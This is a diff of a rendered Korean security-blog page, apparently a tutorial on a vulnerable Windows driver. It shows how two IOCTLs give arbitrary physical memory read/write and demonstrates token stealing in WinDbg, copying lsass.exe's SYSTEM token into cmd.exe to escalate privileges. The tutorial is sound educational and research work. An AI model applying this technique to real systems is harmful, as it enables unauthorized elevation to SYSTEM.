@@ -256,6 +256,7 @@
 <span class="hljs-comment">// 0x0000000000000001</span>
 
 DeviceIoControl(dHandle, <span class="hljs-number">0x81112F08</span>, input_buff, <span class="hljs-number">0x40</span>, output_buff, <span class="hljs-number">0x100c</span>, &amp;dwRet, <span class="hljs-number">0</span>))</code></pre>
+
 <p><img src="/2021/07/28/l0ch/windows-driver-part3/2.png" srcset="/img/loading.gif" alt="windows-driver-part3/2.png"></p>
 <p>input buffer&#xC758; <code>0x4141414141414141</code>&#xACFC; <code>0x00000001</code>&#xC774; <code>sub_1400063D0</code>&#xC758; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xCC28;&#xB840;&#xB300;&#xB85C; &#xB4E4;&#xC5B4;&#xAC04; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB124;&#xC694;. <del>&#xB09C; &#xC800; 0x41414141 &#xBCFC; &#xB54C; &#xAE30;&#xBD84;&#xC774; &#xC81C;&#xC77C; &#xC88B;&#xB354;&#xB77C;</del>  &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB97C; &#xB2E4;&#xC2DC; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <p><img src="/2021/07/28/l0ch/windows-driver-part3/Untitled.png" srcset="/img/loading.gif" alt="windows-driver-part3/Untitled.png"></p>
@@ -268,6 +269,7 @@ DeviceIoControl(dHandle, <span class="hljs-number">0x81112F08</span>, input_buff
     INT64 read_addr; 
     DWORD num_of_bytes;
 } READ_INPUT_BUFFER;</code></pre>
+
 <p><code>0x81112F08</code>&#xC758; input buffer structure&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xAD6C;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <p>&#xC774;&#xC81C; user input&#xC744; &#xD1B5;&#xD574; <code>0x81112F08</code> &#xB8E8;&#xD2F4;&#xC758; <code>MmMapIoSpace</code>&#xC5D0; &#xC784;&#xC758;&#xC758; &#xBB3C;&#xB9AC; &#xC8FC;&#xC18C;&#xC640; &#xB9E4;&#xD551; &#xC0AC;&#xC774;&#xC988;&#xB97C; &#xC904; &#xC218; &#xC788;&#xACE0; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xC5D0; &#xB9E4;&#xD551;&#xB41C; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C;&#xB97C; &#xC77D;&#xC744; &#xC218; &#xC788;&#xC5B4; arbitrary read&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xBC18;&#xB300;&#xB85C; &#xBB3C;&#xB9AC; &#xC8FC;&#xC18C;&#xC5D0; &#xB9E4;&#xD551;&#xB41C; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C;&#xC5D0; &#xAC12;&#xC744; &#xC4F0;&#xB294; <code>0x81112F0C</code> &#xC758; &#xB8E8;&#xD2F4;&#xB3C4; &#xB3D9;&#xC77C;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB9E4;&#xD551;&#xB41C; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C;&#xC5D0; &#xC6B0;&#xB9AC;&#xAC00; &#xC784;&#xC758;&#xC758; &#xAC12;&#xC744; &#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p>
 <p>arbitrary read/write primitive&#xB97C; &#xBAA8;&#xB450; &#xC5BB;&#xC5C8;&#xB124;&#xC694;! &#xC774;&#xC81C; &#xC774;&#xAC78; &#xC774;&#xC6A9;&#xD574; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p>
@@ -293,6 +295,7 @@ PROCESS ffffe405af71c0c0
     Image: lsass.exe
 ..
 </code></pre>
+
 <p>&#xD604;&#xC7AC; &#xB514;&#xBC84;&#xAE30; &#xBA38;&#xC2E0;&#xC5D0;&#xC11C; &#xB3CC;&#xC544;&#xAC00;&#xB294; &#xBAA8;&#xB4E0; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xB9AC;&#xC2A4;&#xD2B8;&#xAC00; &#xB739;&#xB2C8;&#xB2E4;. &#xB108;&#xBB34; &#xB9CE;&#xC73C;&#xB2C8;.. &#xBA87; &#xAC1C; &#xB098;&#xC624;&#xBA74; &#xC911;&#xB2E8;&#xD558;&#xACE0;, <code>lsass.exe</code> &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC608;&#xC2DC;&#xB85C; &#xB4E4;&#xC5B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.  </p>
 <blockquote>
 <p>lsass.exe : &#xB85C;&#xCEEC; &#xBCF4;&#xC548; &#xC778;&#xC99D; &#xD558;&#xC704; &#xC2DC;&#xC2A4;&#xD15C; &#xC11C;&#xBE44;&#xC2A4;. &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xBCF4;&#xC548; &#xC815;&#xCC45;&#xC744; &#xAC15;&#xD654;&#xB97C; &#xC704;&#xD55C; &#xC708;&#xB3C4;&#xC6B0;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC774;&#xB2E4;. &#xC774;&#xAC83;&#xC740; &#xC708;&#xB3C4;&#xC6B0; &#xCEF4;&#xD4E8;&#xD130;&#xB098; &#xC11C;&#xBC84;&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xB294; &#xC720;&#xC800;&#xB4E4;&#xC758; &#xB85C;&#xADF8;&#xC778;&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xBA70;, &#xBE44;&#xBC00;&#xBC88;&#xD638; &#xBCC0;&#xACBD;&#xC744; &#xAD00;&#xB9AC;&#xD558;&#xACE0;, &#xC561;&#xC138;&#xC2A4; &#xD1A0;&#xD070;&#xC744; &#xC0DD;&#xC131;&#xD55C;&#xB2E4;. &#xB610;&#xD55C; Windows Security Log&#xB97C; &#xC791;&#xC131;&#xD55C;&#xB2E4;.<br>(&#xB531; &#xBD10;&#xB3C4; &#xCEE4;&#xB110; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xB9E4;&#xC6B0; &#xB9E4;&#xC6B0; &#xC911;&#xC694;&#xD55C; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xAC19;&#xC544; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;&#x314E;&#x314E;)</p>
@@ -304,6 +307,7 @@ PROCESS ffffe405af71c0c0
    +<span class="hljs-number">0x5a8</span> ImageFileName   : [<span class="hljs-number">15</span>]  <span class="hljs-string">&quot;lsass.exe&quot;</span>
 
 * &#xC624;&#xD504;&#xC14B;&#xC740; &#xC708;&#xB3C4;&#xC6B0; &#xBE4C;&#xB4DC; &#xBC84;&#xC804;&#xBCC4; &#xC0C1;&#xC774;</code></pre>
+
 <p>&#xC6B0;&#xC120;&#xC740; &#xD574;&#xB2F9; &#xD544;&#xB4DC;&#xB4E4;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC744; &#xAE30;&#xC5B5;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; &#xD558;&#xB098;&#xC529; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xC8E0;!</p>
 <ul>
 <li><code>UniqueProcessId</code> : &#xD504;&#xB85C;&#xC138;&#xC2A4; ID(PID)</li>
@@ -318,6 +322,7 @@ PROCESS ffffe405af71c0c0
     [+<span class="hljs-number">0x000</span>] Object           : <span class="hljs-number">0xffff990bec2356bc</span> [Type: <span class="hljs-keyword">void</span> *]
     [+<span class="hljs-number">0x000</span> ( <span class="hljs-number">3</span>: <span class="hljs-number">0</span>)] RefCnt           : <span class="hljs-number">0xc</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]
     [+<span class="hljs-number">0x000</span>] Value            : <span class="hljs-number">0xffff990bec2356bc</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]</code></pre>
+
 <p><code>Value</code> &#xD544;&#xB4DC;&#xAC00; &#xBC14;&#xB85C; &#xAD8C;&#xD55C; &#xC2DD;&#xBCC4; &#xAC12;&#xC785;&#xB2C8;&#xB2E4;. &#xC5B4;&#xB5A0;&#xD55C; &#xAD8C;&#xD55C;&#xC774; &#xC8FC;&#xC5B4;&#xC9C4; Token Value&#xC778;&#xC9C0;&#xB294; <code>!token [Value &amp; 0xffffffffffffffff0]</code>&#xC640; &#xAC19;&#xC774; &#xD558;&#xC704; 4bit&#xB97C; 0&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs c"><span class="hljs-number">0</span>: kd&gt; !token <span class="hljs-number">0xffff990bec2356b0</span>
 _TOKEN <span class="hljs-number">0xffff990bec2356b0</span>
@@ -344,6 +349,7 @@ Privs:
  <span class="hljs-number">10</span> <span class="hljs-number">0x00000000a</span> SeLoadDriverPrivilege             Attributes - 
  <span class="hljs-number">11</span> <span class="hljs-number">0x00000000b</span> SeSystemProfilePrivilege          Attributes - Enabled Default
 ...</code></pre>
+
 <p>User&#xB97C; &#xBCF4;&#xBA74; <code>S-1-5-18</code> &#xB85C; &#xD45C;&#xC2DC;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; SID(Security Identifier)&#xB77C;&#xACE0; &#xD558;&#xBA70;, &#xAC01; &#xC0AC;&#xC6A9;&#xC790;&#xC758; SID&#xB294; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://renenyffenegger.ch/notes/Windows/security/SID/index">https://renenyffenegger.ch/notes/Windows/security/SID/index</a> &#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <p><img src="/2021/07/28/l0ch/windows-driver-part3/Untitled%201.png" srcset="/img/loading.gif" alt="windows-driver-part3/Untitled%201.png"></p>
 <p><code>NT AUTHORITY\SYSTEM</code> &#xACC4;&#xC815;&#xC758; &#xAD8C;&#xD55C;&#xC778; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB124;&#xC694;!</p>
@@ -378,18 +384,27 @@ PROCESS ffffe405b50d1080
     [+<span class="hljs-number">0x000</span>] Object           : <span class="hljs-number">0xffff990bf7037067</span> [Type: <span class="hljs-keyword">void</span> *]
     [+<span class="hljs-number">0x000</span> ( <span class="hljs-number">3</span>: <span class="hljs-number">0</span>)] RefCnt           : <span class="hljs-number">0x7</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]
     [+<span class="hljs-number">0x000</span>] Value            : <span class="hljs-number">0xffff990bf7037067</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]</code></pre>
+
+
+
 <p>Token&#xC758; &#xC704;&#xCE58;&#xB294; <code>ffffe405b50d1080 + 4b8 = ffffe405b50d1538</code> &#xC774; &#xB418;&#xACA0;&#xB124;&#xC694;.</p>
 <pre><code class="hljs c"><span class="hljs-number">0</span>: kd&gt; dps FFFFE405B50D1538
 ffffe405`b50d1538  ffff990b`f7037067
 ffffe405`b50d1540  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>
 ffffe405`b50d1548  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>
 ffffe405`b50d1550  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span></code></pre>
+
+
+
 <p>&#xC774;&#xC81C; &#xC774; Token Value&#xB97C; Windbg&#xC758; memory edit&#xAE30;&#xB2A5;&#xC73C;&#xB85C; &#xC544;&#xAE4C; <code>lsass.exe</code>&#xC758; Token Value&#xC778; <code>0xffff990bec2356bc</code>&#xB85C; &#xBC14;&#xAFC9;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs c"><span class="hljs-number">0</span>: kd&gt; eq FFFFE405B50D1538 <span class="hljs-number">0xffff990bec2356bc</span>
 <span class="hljs-number">0</span>: kd&gt; dps FFFFE405B50D1538
 ffffe405`b50d1538  ffff990b`ec2356bc
 ffffe405`b50d1540  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>
 ffffe405`b50d1548  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span></code></pre>
+
+
+
 <p>&#xB2E4;&#xC2DC; &#xB514;&#xBC84;&#xAE30; &#xBA38;&#xC2E0;&#xC73C;&#xB85C; &#xB3CC;&#xC544;&#xAC00; <code>cmd.exe</code>&#xC758; &#xACC4;&#xC815;&#xC744; &#xD655;&#xC778;&#xD558;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>nt authority\system</code> &#xC73C;&#xB85C; &#xBC14;&#xB010; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p>
 <p><img src="/2021/07/28/l0ch/windows-driver-part3/Untitled%203.png" srcset="/img/loading.gif" alt="windows-driver-part3/Untitled%203.png"></p>
 <p><img src="/2021/07/28/l0ch/windows-driver-part3/Untitled%204.png" srcset="/img/loading.gif" alt="windows-driver-part3/Untitled%204.png"></p>
@@ -416,11 +431,11 @@ ffffe405`b50d1548  <span class="hljs-number">00000000</span>`<span class="hljs-n
                 <div class="post-meta">
                   <i class="iconfont icon-tags"></i>
                   
-                  <a class="hover-with-bg" href="/tags/windows/">windows</a>
+                  <a class="hover-with-bg" href="/tags/lpe/">lpe</a>
                   
                   <a class="hover-with-bg" href="/tags/kernel/">kernel</a>
                   
-                  <a class="hover-with-bg" href="/tags/lpe/">lpe</a>
+                  <a class="hover-with-bg" href="/tags/windows/">windows</a>
                   
                   <a class="hover-with-bg" href="/tags/L0ch/">L0ch</a>
                   
